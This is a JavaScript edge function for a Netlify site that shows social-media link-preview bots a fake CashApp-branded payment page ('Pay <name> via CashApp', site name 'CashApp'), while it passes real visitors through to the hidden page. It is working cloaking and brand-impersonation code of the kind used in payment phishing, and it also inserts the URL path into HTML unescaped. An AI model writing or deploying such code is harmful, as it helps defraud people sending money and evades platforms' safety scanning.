export default async (request, context) => {
  const url = new URL(request.url);
  const path = url.pathname.replace(/^\//, ''); 
  
  if (!path || path.includes('.') || path.startsWith('api')) {
    return context.next();
  }

  const ua = request.headers.get('user-agent') || '';
  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|LinkedInBot|SkypeUriPreview|Slackbot/i.test(ua);

  if (!isBot) {
    return context.next(); 
  }

  const username = path.split('/')[0];
  const formattedName = username.charAt(0).toUpperCase() + username.slice(1);
  const title = `Pay ${formattedName} via CashApp`;
  const description = `Send secure payment instantly to ${formattedName} via CashApp.`;
  
  const previewImageUrl = `https://via.placeholder.com/1200x630/00D632/FFFFFF?text=CashApp+Pay+to+${encodeURIComponent(formattedName)}`;
  const currentUrl = `https://cash-app-pay.netlify.app/${username}`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>${title}</title>
  <meta name="description" content="${description}" />
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="CashApp" />
  <meta property="og:title" content="${title}" />
  <meta property="og:description" content="${description}" />
  <meta property="og:image" content="${previewImageUrl}" />
  <meta property="og:image:secure_url" content="${previewImageUrl}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:url" content="${currentUrl}" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="${title}" />
  <meta name="twitter:description" content="${description}" />
  <meta name="twitter:image" content="${previewImageUrl}" />
</head>
<body><p>${title}</p></body>
</html>`;

  return new Response(html, {
    headers: { 'Content-Type': 'text/html; charset=utf-8' }
  });
};

export const config = {
  path: '/*'
};